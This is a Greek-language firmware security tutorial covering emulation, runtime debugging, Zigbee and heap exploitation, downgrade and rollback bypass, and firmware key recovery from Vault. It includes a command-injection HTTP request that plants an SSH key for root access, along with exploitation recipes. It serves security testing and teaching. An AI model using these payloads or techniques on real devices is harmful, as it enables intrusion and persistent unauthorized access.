Η διαδικασία emulation του firmware επιτρέπει **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να παρουσιάσει δυσκολίες λόγω εξαρτήσεων από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προρυθμισμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Emulation μεμονωμένων binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να γίνει emulation ενός binary αρχιτεκτονικής MIPS, μπορεί να χρησιμοποιηθεί η εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian επιλέγεται το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με χρήση του emulator `qemu-arm` για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystems για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά οι offsets του inode, του directory ή του fragment table είναι αδύνατοι, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο early boot binary και αναπαραγάγετε το γράφημα συσκευών μπλοκ που δημιουργεί: τα ενσωματωμένα συστήματα ενδέχεται να εμφανίζουν ένα φαινομενικό root partition, αλλά να δημιουργούν το πραγματικό filesystem με μια αντιστοίχιση `dm-linear` που προσθέτει sectors δανεισμένα από άλλο partition. Οι έλεγχοι που εξετάζουν μόνο το superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους υπολογισμούς του firmware. Ειδικότερα, προσδιορίστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 bytes ή pages των 4 KiB· αναπαραγάγετε τα shifts και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από το bank σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα περικόπτει σε όριο 4 KiB και μόνο τότε εκφράζει το αποτέλεσμα σε sectors των 512 bytes· αν αντικατασταθεί από `partition_bytes // 512`, η προσαρτημένη έκταση μπορεί να μετακινηθεί κατά μερικά kilobytes και να αλλοιώσει όλους τους επόμενους πίνακες SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη διαδικασία επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το verifier/init binary τη συσκευή προέλευσης, το αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τους κανόνες ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε να βρεθούν διαδοχικές έγκυρες δομές metadata, αντί να βασιστείτε μόνο σε ένα πιθανό superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής διάσχιση όλων των directories και των fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση του dm-verity υπό τον έλεγχο του αναλυτή

Όταν ο αναλυτής ελέγχει τον QEMU kernel, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του κατασκευαστή με ένα μικρό, στατικά συνδεδεμένο init. Αυτό είναι **αντικατάσταση της αλυσίδας εκκίνησης στο εργαστήριο**, όχι παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού σφραγισμένου από TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης θα πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να προσαρτήσει το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την κατά λάθος αποσύνδεση mount points που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε την τροποποιήσιμη κατάσταση της συσκευής ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα qcow2 overlay μπορεί να διατηρεί την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος virtio δίσκος μόνο για ανάγνωση παρέχει το τροποποιημένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης image εκτός σύνδεσης

Επιθεωρήστε τη μόνιμη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή της κονσόλας αποκρύπτουν την αστοχία. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιείται από εκτελούμενη VM· εκθέστε το με qemu-nbd, περιορίστε την ανακάλυψη LVM στην προβλεπόμενη κατάτμηση NBD και απενεργοποιήστε την ομάδα τόμων πριν την αποσυνδέσετε.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονοσήμανση σε έναν σταθερό, εγγράψιμο τόμο και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, FIFO και οι παροδικές κονσόλες μπορεί να δώσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` έναντι `/lib/modules/`, τα χαρακτηριστικά του ext4 στον δίσκο έναντι των ρυθμίσεων του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται με `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, για την ανάλυση χρησιμοποιείται είτε πραγματικό είτε εξομοιωμένο περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο σύστημα αρχείων. Η εξομοίωση μπορεί να μην αναπαράγει τέλεια τις αλληλεπιδράσεις με το hardware, οπότε ενδέχεται να χρειάζονται περιστασιακές επανεκκινήσεις της. Η ανάλυση πρέπει να επανεξετάζει το σύστημα αρχείων, να εκμεταλλεύεται εκτεθειμένες ιστοσελίδες και υπηρεσίες δικτύου και να διερευνά ευπάθειες του bootloader. Οι δοκιμές ακεραιότητας firmware είναι κρίσιμες για τον εντοπισμό πιθανών backdoor ευπαθειών.

## Τεχνικές ανάλυσης κατά την εκτέλεση

Η ανάλυση κατά την εκτέλεση περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα binary στο περιβάλλον λειτουργίας του, με εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για embedded targets χωρίς πλήρες debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Χαρτογράφηση μηνυμάτων Zigbee / radio-co-processor

Στους IoT hubs, το RF stack συχνά είναι χωρισμένο ανάμεσα σε ένα **radio MCU** και μια διεργασία Linux userland. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα binary radio frames σε ένα textual protocol όπως το `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τις **message groups** και τους dispatch tables
- Ποια μηνύματα μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά το **commissioning**, την ανακάλυψη ή τις φάσεις λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, η καταγραφή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που ελέγξατε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και FSM-gated προσβασιμότητα

Οι vendor-specific εντολές Zigbee/ZCL αποτελούν συχνά καλύτερο στόχο από τα standardized clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **vendor-only handler**.
- Ανακτήστε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντοπίστε **transitional states** που προχωρούν αυτόματα, καθώς και τα retry/error branches που τελικά κάνουν reset ή αποδεσμεύουν state ελεγχόμενο από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέσετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η επανάληψη πακέτων από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι να εξομοιώσετε μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία bug με fragmented downloads σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocate `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα attacker-controlled **packet-local** πεδία, όπως το `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει το **αρχικό μέγεθος της allocation**.

Έτσι, ο επιτιθέμενος μπορεί να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο total size, ώστε να εξαναγκάσει μια μικρή heap allocation.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο packet-local size που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί overflow στο αρχικά δεσμευμένο buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **εξομοίωση συσκευής**, ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των κακοσχηματισμένων fragments.

### Triggers `free()` που προκαλούνται από το πρωτόκολλο

Σε embedded daemons, ο ευκολότερος τρόπος να ενεργοποιηθεί heap metadata exploitation συχνά δεν είναι «να περιμένετε τον καθαρισμό», αλλά να **εξαναγκάσετε τον ίδιο τον χειρισμό σφαλμάτων του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα follow-up fragments για να οδηγήσετε το FSM σε **retry** ή **error** states.
- Υπερβείτε το retry threshold, ώστε ο daemon να κάνει **reset context** και να αποδεσμεύσει το αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε allocator-side primitives πριν καταρρεύσει η διεργασία για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο εναντίον allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό μοτίβο είναι να αλλοιώσετε ένα **size field**, ώστε να κατευθύνετε την περιήγηση του allocator σε **fake chunks που έχουν τοποθετηθεί μέσα στο overflowed buffer**, αντί να καταστρέψετε αμέσως πραγματικούς bin pointers και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι binary runtime protections στα embedded συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις για fastbin exploitation σε uClibc (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (εύλογο size, `fd = 0` και τα γειτονικά chunks να θεωρούνται "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries υπό ASLR:** αν το ASLR είναι ενεργοποιημένο αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε έναν **function pointer table**.
- **NUL που σταματά τον parser:** κατά την ανάλυση JSON, ένα `\x00` στο payload μπορεί να σταματήσει την ανάλυση, διατηρώντας παράλληλα τα trailing bytes που ελέγχει ο επιτιθέμενος για ένα stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταβεί σε αυτό.

## Προετοιμασμένα λειτουργικά συστήματα για Firmware Analysis

Λειτουργικά συστήματα όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) προσφέρουν προρυθμισμένα περιβάλλοντα για δοκιμές firmware security, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Προετοιμασμένα OS για ανάλυση Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια distro που προορίζεται να σας βοηθήσει να αξιολογήσετε την ασφάλεια και να κάνετε penetration testing σε συσκευές Internet of Things (IoT). Σας εξοικονομεί πολύ χρόνο, παρέχοντας ένα προρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Λειτουργικό σύστημα για embedded security testing, βασισμένο στο Ubuntu 18.04 και προφορτωμένο με εργαλεία για firmware security testing.

## Επιθέσεις Firmware Downgrade και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη κι όταν ένας vendor υλοποιεί ελέγχους κρυπτογραφικών υπογραφών για firmware images, συχνά παραλείπεται η **προστασία από επαναφορά έκδοσης (downgrade)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ένα ενσωματωμένο public key, αλλά δεν συγκρίνει την *έκδοση* (ή έναν monotonic counter) του image που εγκαθίσταται, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες που έχουν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε ένα παλαιότερο υπογεγραμμένο image**
   * Κατεβάστε το από το δημόσιο portal λήψεων του vendor, από CDN ή από τον ιστότοπο υποστήριξης.
   * Εξαγάγετέ το από συνοδευτικές εφαρμογές για κινητά/desktop (π.χ. από το `assets/firmware/` μέσα σε ένα Android APK).
   * Ανακτήστε το από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία Internet, forums κ.λπ.
2. **Ανεβάστε ή διαθέστε το image στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
   * Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές συσκευές IoT διαθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν από την πλευρά του server και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά το πιο πρόσφατο image ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ, για την ενεργοποίηση πρόσβασης root μέσω SSH key). Σε μεταγενέστερες εκδόσεις firmware προστέθηκε ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά την επιδιόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές κινητών

Πολλοί προμηθευτές συμπεριλαμβάνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώσει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors υλοποιούν όντως ένα **ratchet** κατά του downgrade, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν userspace OTA agent). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα partition ή τα metadata του slot, η προστασία από rollback εξακολουθεί να μπορεί να παρακαμφθεί.<sup>[[7]](#references)</sup>

Συνηθισμένος αδύναμος σχεδιασμός:

- Τα metadata του firmware περιέχουν τόσο έναν περιγραφέα version όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet του image με μια τιμή που είναι αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα images.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο το header, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται χωριστά, σε έναν πίνακα partition ή σε έναν generation counter ανά slot, και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί μια primitive **validate-one-image / boot-another-image** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο boot target χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image και αργότερα να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί να εκκινήσει το downgraded image, επειδή εμπιστεύεται μόνο τα slot metadata που έχουν ήδη καταχωριστεί.

Συνηθισμένο μοτίβο κατάχρησης:

1. Κάντε upload ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα validation/switch, ώστε το layout να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε επανεκκίνηση ακόμα**. Μπείτε ξανά στη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια session.
3. Εκμεταλλευτείτε stale boot-state ή stale slot-selection λογική, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήγαγε.
4. Γράψτε ένα **παλαιότερο αλλά ακόμα υπογεγραμμένο** firmware σε αυτό το slot.
5. Παραλείψτε τη ρουτίνα validation που επιβάλλει το ratchet και κάντε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το προαχθέν slot, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσετε κατά το reverse engineering υλοποιήσεων A/B update:

- Επιλογή slot που προκύπτει από **boot-time flags** τα οποία δεν ανανεώνονται μετά από επιτυχημένο switch.
- Μια ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot με βάση stale state αντί για το **τρέχον καταχωρισμένο layout**.
- Μια συνάρτηση τύπου `part_write_layout()` που αυξάνει μόνο έναν **generation counter** / active flag και δεν αποθηκεύει το hash του επικυρωμένου image.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες erase ή recovery που αφήνουν το slot επισημασμένο ως bootable, ακόμα κι αφού το περιεχόμενό του διαγράφηκε και ξαναγράφηκε.

### Λίστα ελέγχου για την αξιολόγηση της λογικής update

* Προστατεύονται επαρκώς η μεταφορά/αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης slot **δεσμευμένα στο validated firmware digest/version**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχημένο switch slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή είναι ακόμα προσβάσιμες μεταγενέστερες ρουτίνες update/erase στην ίδια session;
* Εκτελεί ο κώδικας userland πρόσθετους sanity checks (π.χ. επιτρεπόμενο partition map, αριθμό μοντέλου);
* Χρησιμοποιούν ξανά οι ροές update *μερικού* ή *backup* την ίδια λογική validation;

> 💡  Αν λείπει κάποιο από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε rollback attacks.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στην ανακάλυψη ευπαθειών σε firmware, χρησιμοποιήστε τα παρακάτω ευάλωτα firmware projects ως αφετηρία.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από embedded κατάσταση KMS/Vault

Όταν ένα update image συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε πρώτα triage του container πριν δοκιμάσετε brute force:<sup>[[1]](#references)</sup>

- Εξαγάγετε headers, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει format OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που κρυπτογραφεί ένα τυχαίο password/session key του firmware.
- Το detached PGP υλικό στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτετε ότι χρησιμοποιείται για εμπιστευτικότητα.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάντε reverse engineering στην **operational decrypt path** αντί να ψάχνετε μόνο για private keys:

- Κάντε decompile το binary του updater / management και εντοπίστε ποιος διαβάζει το encrypted blob, ποιο helper/API το ξετυλίγει και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγμένο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και unit files και init scripts.
- Αντιμετωπίστε εντολές `vault operator unseal ...` σε plaintext, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal του KMS ως ισοδύναμα με υλικό private key.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το storage backend, συνήθως είναι ευκολότερο να αναπαραγάγετε εκείνο το περιβάλλον παρά να επανυλοποιήσετε τα εσωτερικά του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
- Κάντε export το unwrap key: `vault read transit/export/encryption-key/<name>`
